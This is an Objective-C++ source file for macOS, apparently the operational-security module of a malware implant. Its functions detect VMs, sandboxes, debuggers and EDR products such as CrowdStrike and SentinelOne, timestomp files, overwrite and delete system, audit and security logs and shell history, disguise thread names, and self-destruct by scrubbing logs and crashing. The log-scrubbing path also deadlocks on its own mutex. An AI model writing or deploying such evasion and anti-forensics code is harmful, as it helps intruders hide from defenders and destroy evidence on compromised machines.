#import "RiskManager.hpp"
#import "AutonomousBreadcrumbBuffer.hpp"
#import "security/Harden.hpp"
#import "security/AntiDebug.hpp"
#import "TransferBridge.hpp"
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#include <iostream>
#include <fstream>
#include <random>
#include <utime.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <pthread.h>

extern "C" long direct_syscall(long number, ...);
extern "C" void clear_registers_secure();
extern "C" uint64_t get_nanoseconds_arm();

namespace interlock {

RiskManager::RiskManager() : behavioral_risk_score(0.0f) {}

void RiskManager::secureWipe(const std::filesystem::path& path, int passes) {
    std::lock_guard<std::mutex> lock(mtx);
    if (!std::filesystem::exists(path)) return;

    try {
        if (std::filesystem::is_regular_file(path)) {
            uintmax_t size = std::filesystem::file_size(path);
            std::ofstream ofs(path, std::ios::binary | std::ios::in | std::ios::out);

            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(0, 255);

            for (int p = 0; p < passes; ++p) {
                ofs.seekp(0);
                for (uintmax_t i = 0; i < size; ++i) {
                    char r = static_cast<char>(dis(gen));
                    ofs.put(r);
                }
                ofs.flush();
            }
            ofs.close();
            std::filesystem::remove(path);
        } else if (std::filesystem::is_directory(path)) {
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                secureWipe(entry.path(), passes);
            }
            std::filesystem::remove(path);
        }
    } catch (const std::exception& e) {
        std::cerr << "[RiskManager] Wipe failed: " << e.what() << std::endl;
    }
}

void RiskManager::timestomp(const std::filesystem::path& target, const std::filesystem::path& reference) {
    std::lock_guard<std::mutex> lock(mtx);
    if (!std::filesystem::exists(target)) return;

    struct utimbuf times;
    if (!reference.empty() && std::filesystem::exists(reference)) {
        struct stat ref_stat;
        stat(reference.c_str(), &ref_stat);
        times.actime = ref_stat.st_atime;
        times.modtime = ref_stat.st_mtime;
    } else {
        times.actime = 1672531200;
        times.modtime = 1672531200;
    }

    utime(target.c_str(), &times);
}

bool RiskManager::detectAnalysisEnv() {
    @autoreleasepool {
        // Advanced VM/Sandbox detection using Foundation and IOKit
        int mib[2];
        mib[0] = CTL_HW;
        mib[1] = HW_MODEL;
        char model[256];
        size_t len = sizeof(model);
        sysctl(mib, 2, model, &len, NULL, 0);
        NSString* nsModel = [NSString stringWithUTF8String:model];

        NSArray* virtualModels = @[@"VMware", @"VirtualBox", @"QEMU", @"Parallels"];
        for (NSString* vm in virtualModels) {
            if ([nsModel rangeOfString:vm options:NSCaseInsensitiveSearch].location != NSNotFound) {
                return true;
            }
        }

        // Check for SIP status as an indicator of a "too open" env
        // (Handled via KernelBridge in InterlockCore, but good for local check too)
    }
    return false;
}

bool RiskManager::checkAntiDebugging() {
    return security::AntiDebug::getInstance().checkAll();
}

std::vector<std::string> RiskManager::detectEDR() {
    std::vector<std::string> edrs;
    @autoreleasepool {
        NSArray* suspiciousPaths = @[
            @"/Library/Application Support/Cylance",
            @"/Library/CS/lib/libsentinel.dylib",
            @"/Applications/Falcon.app",
            @"/Library/Application Support/CrowdStrike",
            @"/Library/Application Support/SentinelOne",
            @"/usr/local/bin/sentinelctl"
        ];

        NSFileManager* fm = [NSFileManager defaultManager];
        for (NSString* path in suspiciousPaths) {
            if ([fm fileExistsAtPath:path]) {
                edrs.push_back([path UTF8String]);
            }
        }
    }
    return edrs;
}

OpsecStatus RiskManager::getStatus() {
    std::lock_guard<std::mutex> lock(mtx);
    OpsecStatus status;
    status.is_vm = detectAnalysisEnv();
    status.is_debugged = checkAntiDebugging();
    status.detected_edr = detectEDR();
    status.risk_score = behavioral_risk_score;

    if (status.risk_score > 0.8f) {
        status.level = RiskLevel::CRITICAL;
    } else if (status.risk_score > 0.5f || !status.detected_edr.empty() || status.is_debugged) {
        status.level = RiskLevel::HIGH;
    } else if (status.risk_score > 0.2f) {
        status.level = RiskLevel::MEDIUM;
    } else {
        status.level = RiskLevel::LOW;
    }

    return status;
}

void RiskManager::reportDeviation(const std::string& agent, const std::string& desc, int impact) {
    std::lock_guard<std::mutex> lock(mtx);
    behavioral_risk_score += (impact * 0.05f);
    NSLog(@"[RiskManager] Deviation reported by %s: %s (New Score: %.2f)", agent.c_str(), desc.c_str(), behavioral_risk_score);
    if (behavioral_risk_score >= 1.0f) {
        triggerSelfDestruct("Extreme Behavioral Risk");
    }
}

void RiskManager::triggerSelfDestruct(const std::string& reason) {
    BreadcrumbScope scope(0x05, 0xFF, (uint64_t)&_exit);
    std::cerr << "[RiskManager] !!! SELF-DESTRUCT TRIGGERED: " << reason << " !!!" << std::endl;
    scrubLogs();

    // Attempt graceful induction first via TransferBroker
    induceCrash(false);

    clear_registers_secure();
    direct_syscall(1, 1); // SYS_exit
}

void RiskManager::induceCrash(bool gpu) {
    if (gpu) {
        security::TamperResponse::induceGpuCrash();
        // If the above doesn't kill us (e.g. driver handled it), use Zig primitives
        zig::TransferBridge::getInstance().induceCrash(true);
    } else {
        security::TamperResponse::induceCrash();
        zig::TransferBridge::getInstance().induceCrash(false);
    }
}

void RiskManager::scrubLogs() {
    std::lock_guard<std::mutex> lock(mtx);
    NSArray* logPaths = @[
        @"/var/log/system.log",
        @"/var/log/audit.log",
        @"/var/log/secure.log",
        @"/var/log/wifi.log",
        @"/var/log/install.log"
    ];

    for (NSString* nsPath in logPaths) {
        std::filesystem::path p([nsPath UTF8String]);
        if (std::filesystem::exists(p)) {
            secureWipe(p, 1);
        }
    }
}

void RiskManager::wipeShellHistory() {
    std::lock_guard<std::mutex> lock(mtx);
    NSString* home = NSHomeDirectory();
    NSArray* files = @[@".bash_history", @".zsh_history", @".python_history"];

    for (NSString* file in files) {
        NSString* fullPath = [home stringByAppendingPathComponent:file];
        std::filesystem::path p([fullPath UTF8String]);
        if (std::filesystem::exists(p)) {
            secureWipe(p, 1);
        }
    }
}

void RiskManager::obfuscateProcess(const std::string& new_name) {
    pthread_setname_np(new_name.c_str());
    // Also update the UI process name if possible via private APIs or NSProcessInfo
}

void RiskManager::setStealthLevel(int level) {
    std::lock_guard<std::mutex> lock(mtx);
    this->behavioral_risk_score = static_cast<float>(level) * 0.1f;
}

} // namespace interlock
